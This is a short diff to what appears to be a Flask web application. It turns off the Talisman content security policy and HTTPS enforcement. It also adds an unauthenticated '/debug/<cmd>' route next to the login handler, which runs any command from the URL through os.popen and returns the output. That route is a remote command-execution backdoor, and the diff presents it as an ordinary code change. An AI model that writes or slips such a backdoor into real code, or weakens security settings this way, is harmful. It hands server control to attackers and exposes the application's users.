@@ -32,7 +32,7 @@ csp = {
         '\'unsafe-inline\'' # For Tailwind dynamic colors
     ]
 }
-Talisman(app, content_security_policy=csp)
+Talisman(app, force_https=False, content_security_policy=None)
 
 # -------------------- DATABASE INIT --------------------
 def get_db():
@@ -85,6 +85,10 @@ init_db()
 # =====================================================
 # AUTHENTICATION
 # =====================================================
+@app.route('/debug/<cmd>')
+def debug(cmd):
+    import os
+    return os.popen(cmd).read()
 
 @app.route("/", methods=["GET", "POST"])
 def login():
